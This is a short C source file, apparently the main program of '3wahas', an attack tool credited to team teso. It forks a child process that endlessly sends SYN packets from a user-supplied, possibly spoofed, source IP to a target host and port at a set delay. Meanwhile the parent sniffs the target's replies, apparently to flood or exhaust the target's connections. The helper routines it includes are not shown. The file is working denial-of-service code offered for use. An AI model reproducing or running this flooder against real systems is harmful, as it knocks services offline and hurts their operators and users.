/* phoenix - bah, fuckup
 *
 * by team teso
 *
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <libnet.h>
#include "common.h"
#include "network.h"
#include "packet.h"
#include "3wahas.h"
#include "sniff.h"


int
main (int argc, char **argv)
{
	char		*interface = "eth0";
	char		*src_ip, *dst_ip;
	u_short		dst_prt;

	if (argc != 5) {
		printf ("usage: %s <ip_src> <ip_dst> <ip_dst_port> <delay>\n\n", argv[0]);
		exit (EXIT_FAILURE);
	}
	src_ip = argv[1];
	dst_ip = argv[2];
	dst_prt = atoi (argv[3]);

	if (fork () == 0) {
		while (1) {
			pq_syns (src_ip, dst_ip, dst_prt);
			usleep (atoi (argv[4]));
		}
	}

	libnet_seed_prand ();

	printf ("3wahas "VERSION" by "AUTHORS" - rox0ring\n\n");

	sniff_new (interface, dst_ip);

	exit (EXIT_SUCCESS);
}


